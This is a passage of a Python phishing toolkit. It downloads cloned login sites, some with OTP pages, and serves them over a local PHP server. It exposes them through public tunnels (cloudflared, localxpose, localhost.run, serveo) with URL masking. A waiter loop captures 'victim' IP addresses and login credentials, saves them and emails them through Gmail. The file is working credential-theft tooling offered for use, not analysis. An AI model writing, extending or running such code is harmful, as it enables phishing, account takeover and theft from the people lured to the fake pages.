            sprint(f"\n{info}Installing proot{nc}")
            shell("pkg install proot -y")
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system.lower()
    architecture = osinfo.machine
    iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
    isloclx = isfile(f"{tunneler_dir}/loclx")
    delete("cloudflared.tgz", "cloudflared", "loclx.zip")
    internet()
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
        elif "arm" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
        elif "x86_64" in architecture or "amd64" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
        else:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
    elif "darwin" in platform:
        if "x86_64" in architecture or "amd64" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{tunneler_dir}")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
        elif "arm64" in architecture or "aarch64" in architecture:
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
        else:
            print(f"{error}Device architecture unknown. Download cloudflared/loclx manually!")
            sleep(3)
    else:
        print(f"{error}Device not supported!")
        exit(1)
    if isfile("loclx.zip"):
        extract("loclx.zip", f"{tunneler_dir}")
        remove("loclx.zip")
    for tunneler in tunnelers:
        if isfile(f"{tunneler_dir}/{tunneler}"):
            chmod(f"{tunneler_dir}/{tunneler}", 0o755)
    for process in processes:
        if is_running(process):
            print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    if is_installed("cloudflared"):
        cf_command = "cloudflared"
    if is_installed("localxpose"):
        lx_command = "localxpose"
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        print(f"\n{info}Copying website files....")
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if isdir("sites"):
        print(f"\n{info}Copying website files....")
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if get_ver(version) > get_ver(zipver):
                download(websites_url, "websites.zip")
    else:
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        lx_token()
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Only gmail with app password is allowed!{nc}")
            sleep(1)

# Main Menu to choose phishing type

def main_menu():
    global mode, option, mask, troubleshoot, url, redir_url
    shell("stty -echoctl") # Skip printing ^C
    if update:
        updater()
    requirements()
    if troubleshoot in ts_commands:
        command = ts_commands[troubleshoot]
        shell(command)
        pexit()
    while True:
        tempdata = cat(templates_file)
        if is_json(tempdata):
            sites = parse(tempdata)
        else:
            sprint(f"\n{error}templates.json file is corrupted!")
            exit(1)
        customdir = None
        otp_folder = ""
        names = [site["name"] for site in sites]
        choices = [str(i) for i in range(1,len(sites)+1)]
        clear(lol=True)
        show_options(names)
        if option is not None:
            choice = option
        elif mode == "test":
            choice = default_template
        else:
            choice = input(f"{ask}Select one of the options > {green}")
        if choice != "0" and choice.startswith("0"):
            choice = choice.replace("0", "")
        if choice in choices:
            site = sites[int(choice)-1] # Lists start from 0 but our index starts from 1
            folder = site["folder"]
            if "otp_folder" in site:
                otp_folder = site["otp_folder"]
            if "mask" in site:
                mask = site["mask"]
            if "redirect" in site:
                redir_url = site["redirect"]
            if folder == "custom" and mask == "custom":
                customdir = customfol()
            if otp_folder != "":
                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
                if is_otp == "y":
                    folder = otp_folder
            break
        elif choice.lower()=="a":
            about()
        elif choice.lower()=="o":
            add_zip()
        elif choice.lower()=="s":
            saved()
        elif choice.lower()=="m":
            bgtask("xdg-open ' https://github.com/Error200503/ERROR200503#My-Best-Works'")
        elif choice == "0":
            pexit()
        else:
            sprint(f"\n{error}Wrong input {bred}\"{choice}\"")
            option = None
    if customdir is None:
        site = f"{sites_dir}/{folder}"
        if not isdir(site):
            internet()
            delete("site.zip")
            download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
            extract("site.zip", site)
            remove("site.zip")
        copy(site, site_dir)
        write_meta()
        if url is not None:
            redirect_url = url
        else:
            if mode == "test":
                redirect_url = ""
        write_redirect()
    server()

# Start server and tunneling
def server():
    global mode
    clear()
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(2)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    for logfile in [php_file, cf_file, lx_file, lhr_file, svo_file]:
        delete(logfile)
        if not isfile(logfile):
            try:
                mknod(logfile)
            except:
                sprint(f"\n{error}Your terminal lacks file/folder permission! Fix it or run me from docker!")
                pexit()
    php_log = open(php_file, "w")
    cf_log = open(cf_file, "w")
    lx_log = open(lx_file, "w")
    lhr_log = open(lhr_file, "w")
    svo_log = open(svo_file, "w")
    internet()
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        append(e, error_file)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        arguments = f"{arguments} --subdomain {subdomain}"
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
    if key:
        bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    else:
        bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    bgtask(f"ssh -R 80:{local_url} serveo.net -T -n", stdout=svo_log, stderr=svo_log)
    sleep(10)
    cf_success = False
    for _ in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        sleep(1)
    lx_success = False
    for _ in range(10):
        lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
        if lx_url != "https://":
            lx_success = True
            break
        sleep(1)
    lhr_success = False
    for _ in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro))", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        sleep(1)
    svo_success = False
    for _ in range(10):
        svo_url = grep("(https://[-0-9a-z.]*.svo.(life|pro))", svo_file)
        if svo_url != "":
            svo_success = True
            break
        sleep(1)
    if cf_success or lx_success or lhr_success or svo_success:
        sprint(f"\n{info}Your urls are given below:\n")
        if mode == "test":
            print(f"\n{info}URL generation has completed successfully!")
            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
            pexit()
        if cf_success:
            url_manager(cf_url, "CloudFlared")
        if lx_success:
            url_manager(lx_url, "LocalXpose")
        if lhr_success:
            url_manager(lhr_url, "LocalHostRun")
        if svo_success:
            url_manager(svo_url, "Serveo")
        if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
            masking(lx_url)
        elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
            masking(lhr_url)
        elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
            masking(cf_url)
        elif svo_success and tunneler.lower() in [ "serveo", "svo" ]:
            masking(cf_url)
        else:
            print(f"\n{error}URL masking isn't available for {tunneler}!{nc}")
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    delete(ip_file, cred_file)
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

def main():
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        exception_handler(e)

if __name__ == '__main__':
    main()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
